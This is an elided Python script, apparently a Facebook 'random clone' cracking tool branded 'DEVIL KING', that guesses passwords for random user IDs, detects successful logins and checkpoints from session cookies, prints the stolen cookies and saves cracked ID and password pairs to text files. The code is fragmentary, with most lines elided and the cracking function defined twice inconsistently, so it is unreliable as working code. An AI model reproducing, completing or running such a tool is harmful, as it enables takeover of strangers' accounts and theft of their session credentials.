...
\033[1;37m------------------------------------
\033[1;37m Owner   : DEVIL BOY
\033[1;37m Facebook: DEVIL KING
\033[1;37m Github  : PUBLIC
\033[1;37m Version : 0.2
\033[1;37m------------------------------------
\33[1;97m\33[42m[\33[1;31mTOOLS\x1b[38;5;208m: \33[1;31mDEVIL KING RANDOM CLONE TOOL \33[1;97m-0.1\33[1;97m]\x1b[0m
\33[1;92m---------------------------------------""") 
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/profile.php?id=100090131821628&mibextid=ZbWKwL")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[Devil king-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;97m{coki}")
				open('Devil king-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[Devil king-CP] '+uid+' | '+ps+'\033[0;97m')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[Devil king-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mdevil KING\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 